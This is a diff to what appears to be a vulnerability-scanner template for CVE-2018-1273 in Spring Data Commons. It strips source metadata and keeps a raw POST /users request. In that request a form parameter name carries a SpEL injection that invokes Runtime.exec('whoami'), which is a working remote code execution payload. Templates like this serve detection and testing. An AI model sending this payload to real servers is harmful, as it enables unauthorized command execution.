@@ -3,20 +3,14 @@ info:
   name: Spring_CVE_2018_1273
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ylft4qmqxe0nq3el'
+  description: ''
   tags: other,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ylft4qmqxe0nq3el
-    fofa: 暂无
 http:
 - raw:
   - 'POST /users HTTP/1.1
 
 
     Content-type: application/x-www-form-urlencoded
-
-
 
 
     username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]
